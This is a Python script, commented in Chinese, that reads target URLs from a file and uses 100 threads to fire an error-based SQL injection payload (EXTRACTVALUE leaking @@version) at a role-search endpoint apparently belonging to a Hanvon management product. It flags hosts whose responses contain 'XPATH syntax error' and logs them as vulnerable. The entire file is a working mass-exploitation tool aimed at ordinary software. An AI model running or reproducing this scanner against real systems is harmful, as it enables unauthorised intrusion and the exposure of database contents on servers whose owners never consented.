
import requests
import threading
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
import time
import os

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

class VulnerabilityScanner:
    def __init__(self, threads=100):
        self.threads = threads
        self.poc_path = "/manage/systemRoleMgr/searchSystemRoles.do?branchId=1&columnKey=id&deviceName=test&id=1&order=OR+EXTRACTVALUE(2605,CONCAT(0x5c,@@version,0x5c,(SELECT+(ELT(2605=2605,1)))))&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS"
        self.vulnerable_count = 0
        self.scanned_count = 0
        self.lock = threading.Lock()
        self.result_file = "result.txt"
        
        # 初始化结果文件
        self.init_result_file()
    
    def init_result_file(self):
        """初始化结果文件，写入表头"""
        try:
            with open(self.result_file, 'w', encoding='utf-8') as f:
                f.write("SQL注入漏洞检测结果\n")
                f.write("=" * 50 + "\n")
                f.write(f"扫描开始时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"线程数: {self.threads}\n")
                f.write("=" * 50 + "\n\n")
                f.write("存在漏洞的URL:\n")
                f.write("-" * 30 + "\n")
            print(f"[INFO] 结果文件已初始化: {self.result_file}")
        except Exception as e:
            print(f"[ERROR] 初始化结果文件时出错: {e}")
    
    def write_vulnerability(self, url, response_status, response_text_sample=""):
        """立即写入发现的漏洞"""
        try:
            with self.lock:  # 加锁确保线程安全
                with open(self.result_file, 'a', encoding='utf-8') as f:
                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                    f.write(f"[{timestamp}] 漏洞URL: {url}\n")
                    f.write(f"   状态码: {response_status}\n")
                    if response_text_sample:
                        # 只写入响应文本的前200个字符作为样本
                        sample = response_text_sample[:200] + "..." if len(response_text_sample) > 200 else response_text_sample
                        f.write(f"   响应样本: {sample}\n")
                    f.write("-" * 50 + "\n")
                print(f"[SUCCESS] 漏洞详情已写入文件: {url}")
        except Exception as e:
            print(f"[ERROR] 写入漏洞结果时出错: {e}")
    
    def write_final_summary(self):
        """写入最终统计信息"""
        try:
            with open(self.result_file, 'a', encoding='utf-8') as f:
                f.write("\n" + "=" * 50 + "\n")
                f.write("扫描统计信息:\n")
                f.write(f"扫描完成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"总扫描URL数: {self.scanned_count}\n")
                f.write(f"发现漏洞数: {self.vulnerable_count}\n")
                f.write("=" * 50 + "\n")
            print(f"[INFO] 最终统计信息已写入文件")
        except Exception as e:
            print(f"[ERROR] 写入统计信息时出错: {e}")
    
    def check_url(self, url):
        """检查单个URL是否存在漏洞"""
        try:
            # 清理URL
            url = url.strip()
            if not url:
                return None, "Empty URL"
            
            # 构建完整URL
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            target_url = urljoin(url, self.poc_path)
            
            # 发送请求
            headers = {
                'Host': 'hanvon.mrxn.net',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.get(
                target_url,
                headers=headers,
                verify=False,
                timeout=10,
                allow_redirects=False  # 不跟随重定向
            )
            
            # 更新扫描计数
            with self.lock:
                self.scanned_count += 1
            
            current_count = self.scanned_count
            print(f"[SCANNED] [{current_count}] {url} - 状态码: {response.status_code}")
            
            # 检查状态码
            if 300 <= response.status_code < 400:
                print(f"[INFO] {url} - 状态码 {response.status_code} (3xx重定向)，漏洞不存在")
                return url, "no_vulnerability"
            
            # 检查漏洞条件
            if response.status_code == 200:
                if "XPATH syntax error" in response.text:
                    with self.lock:
                        self.vulnerable_count += 1
                    print(f"[VULNERABLE] {url} - 存在SQL注入漏洞!")
                    
                    # 立即写入漏洞结果
                    self.write_vulnerability(url, response.status_code, response.text)
                    return url, "vulnerable"
                else:
                    print(f"[INFO] {url} - 状态码 200，但未检测到漏洞特征")
                    return url, "no_vulnerability"
            else:
                print(f"[INFO] {url} - 状态码 {response.status_code}，漏洞不存在")
                return url, "no_vulnerability"
                
        except requests.exceptions.RequestException as e:
            error_msg = f"请求错误: {str(e)}"
            print(f"[ERROR] {url} - {error_msg}")
            return url, f"error: {error_msg}"
        except Exception as e:
            error_msg = f"未知错误: {str(e)}"
            print(f"[ERROR] {url} - {error_msg}")
            return url, f"error: {error_msg}"
    
    def scan_from_file(self, filename):
        """从文件读取URL并进行扫描"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[ERROR] 文件 {filename} 不存在")
            return
        except Exception as e:
            print(f"[ERROR] 读取文件时出错: {e}")
            return
        
        if not urls:
            print("[INFO] URL列表为空")
            return
        
        print(f"[INFO] 开始扫描 {len(urls)} 个URL，线程数: {self.threads}")
        start_time = time.time()
        
        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # 提交所有任务
            future_to_url = {executor.submit(self.check_url, url): url for url in urls}
            
            # 收集结果
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result_url, status = future.result()
                    if result_url:
                        results.append((result_url, status))
                except Exception as e:
                    print(f"[ERROR] 处理 {url} 时发生异常: {e}")
        
        # 写入最终统计信息
        self.write_final_summary()
        
        end_time = time.time()
        print(f"\n[INFO] 扫描完成!")
        print(f"[INFO] 总扫描数: {self.scanned_count}")
        print(f"[INFO] 存在漏洞: {self.vulnerable_count}")
        print(f"[INFO] 耗时: {end_time - start_time:.2f} 秒")
        
        # 最终提醒
        if self.vulnerable_count > 0:
            print(f"[SUCCESS] 发现 {self.vulnerable_count} 个漏洞，详情请查看 {self.result_file}")
        else:
            print("[INFO] 未发现漏洞")

def main():
    """主函数"""
    print("SQL注入漏洞扫描器")
    print("=" * 40)
    
    # 设置线程数
    threads = 100
    scanner = VulnerabilityScanner(threads=threads)
    
    # 扫描文件
    input_file = "url.txt"
    scanner.scan_from_file(input_file)

if __name__ == "__main__":
    main()